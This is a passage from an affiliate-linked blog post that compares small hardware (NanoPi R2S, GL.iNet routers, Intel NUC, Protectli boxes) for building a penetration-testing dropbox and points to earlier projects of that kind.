handful of the Raspberry Pi clones like the <a href="https://www.friendlyarm.com/index.php?route=product/product&amp;product_id=282">NanoPi
R2S</a>.
There are also a number of less powerful (in terms of CPU and RAM) options
available in the portable router space.  Obviously, running on the vendor
firmware doesn’t give you a lot of options, so I look exclusively for devices
that are well-supported by OpenWRT.  GL.iNet specializes in this space, and I’ve
used several of their <a href="https://amzn.to/3ekfide">AR-750S “Slate” Portable Router</a>
for various projects, though it’s not the most inconspicuous device ever.</p>

<p><a href="https://www.amazon.com/Firewall-Micro-Appliance-Gigabit-Intel/dp/B01H2QJTM4/ref=as_li_ss_il?dchild=1&amp;keywords=protectli&amp;qid=1594584715&amp;sr=8-2-spons&amp;psc=1&amp;spLa=ZW5jcnlwdGVkUXVhbGlmaWVyPUExQ1BJNkQ2RTBPMUpNJmVuY3J5cHRlZElkPUEwMTcyNTQwOVNYUTRKMVdJMzJSJmVuY3J5cHRlZEFkSWQ9QTA1MTIxMjAxU05DNDlSOVRZME1VJndpZGdldE5hbWU9c3BfYXRmJmFjdGlvbj1jbGlja1JlZGlyZWN0JmRvTm90TG9nQ2xpY2s9dHJ1ZQ==&amp;linkCode=li2&amp;tag=systemovecom-20&amp;linkId=c1143e2a606c31608df4f9ff7f5459c4&amp;language=en_US"><img src="https://ws-na.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;ASIN=B01H2QJTM4&amp;Format=_SL160_&amp;ID=AsinImage&amp;MarketPlace=US&amp;ServiceVersion=20070822&amp;WS=1&amp;tag=systemovecom-20&amp;language=en_US" alt="Small Form Factor PC Dropbox"></a></p>

<p>If, on the other hand, you’re looking for as much local processing power and/or
storage as you can get, you can get a very small form factor PC like the <a href="https://amzn.to/3gSQPgQ">Intel
NUC</a>, or even small PCs designed for firewall usage,
like devices from <a href="https://amzn.to/2ZkOrcv">Protectli</a>.  These use x86
processors and can have features like AES-NI, more RAM, and can use mSATA or m.2
SSDs.  They’re more conspicuous, more expensive (though given the typical cost
of a penetration testing engagement, probably not relevant), and more
power-hungry (almost all the other options can be powered off USB).</p>



<p>I’m certainly not the first to discuss using a Raspberry Pi as a penetration
testing dropbox, and there have been some cool projects in this space before.
There’s this great project where <a href="https://hackaday.com/2012/10/04/malicious-raspberry-pi-power-strip-looks-a-bit-scary/">a Raspberry Pi is embedded in a power
strip</a>.
Unfortunately, their original project page is no longer online.</p>

<p>Artifice Security has an <a href="https://artificesecurity.com/blog/2019/8/6/how-to-build-your-own-penetration-testing-drop-box-using-a-raspberry-pi-4">interesting
post</a>
that describes their approach to similar uses.  They specifically discuss the
use of the CrazyRadio Mousejack attacks, and other techniques not covered here.</p>

  </div><p>This post contains affiliate links.  If you click on
a link, I may earn a small commission at no cost to you.</p></div></div>
    </div>
    <footer>
        <div>created by buildstarted &copy; 2020 <a href="/about">about</a></div>
        <div>Share this page on social media: copy and paste this url https://linksfor.dev/</div>
        <div>If you prefer RSS: <a href="https://linksfor.dev/feed.xml">https://linksfor.dev/feed.xml</a></div>
        <div>Customer satisfaction guaranteed to be optional.</div>
    </footer>
    
    <script async defer>
        _dna = window._dna || {};
        _dna.siteId = "linksfor.devs";
        _dna.outlink = true;

        (function() {
            let dna = document.createElement('script');
            dna.type = 'text/javascript';
            dna.async = true;
            dna.src = '//dna.buildstarted.com/t.js';
            let s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(dna, s);
        })();
    </script>
    <noscript><img src="//dna.buildstarted.com/g?siteId=linksfor.devs"/></noscript>
</body>
</html>